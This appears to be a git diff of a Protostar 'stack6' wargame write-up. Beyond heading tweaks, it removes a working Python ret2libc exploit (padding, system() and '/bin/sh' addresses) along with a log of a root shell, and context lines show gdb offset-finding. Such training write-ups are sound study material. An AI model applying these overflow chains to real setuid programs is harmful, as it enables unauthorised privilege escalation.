@@ -1,6 +1,6 @@
 # stack6
 
-## Solution
+## solution
 Finding the offset to %eip.
 ```
 (gdb) r
@@ -41,9 +41,9 @@ id
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-## Shells
+## shells
 
-### Rop Chain to Shellcode
+### classic buffer overflow (sort of)
 ```py
 import struct
 
@@ -73,32 +73,7 @@ input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Rop Chain to Libc
-```py
-import struct
-
-off = 80
-
-pad = 'A' * off
-
-system = struct.pack('I', 0xb7ecffb0)
-bin_sh = struct.pack('I', 0xb7e97000 + 0x11f3bf)
-
-ret = struct.pack('I', 0x08048508)
-ret += system
-
-print pad + ret + 'AAAA' + bin_sh
-```
-
-Here it is in action.
-```
-user@protostar:/opt/protostar/bin$ (python /tmp/pwn.py; cat) | ./stack6
-input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���AAAA�c��
-id
-uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
-```
-
-### Ret2.text to Shellcode
+### ret2.text to shellcode
 ```py
 import struct
 
@@ -131,7 +106,7 @@ input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
 ```
 
-### Ret2.text to Libc
+### ret2.text to libc
 ```py
 import struct
 
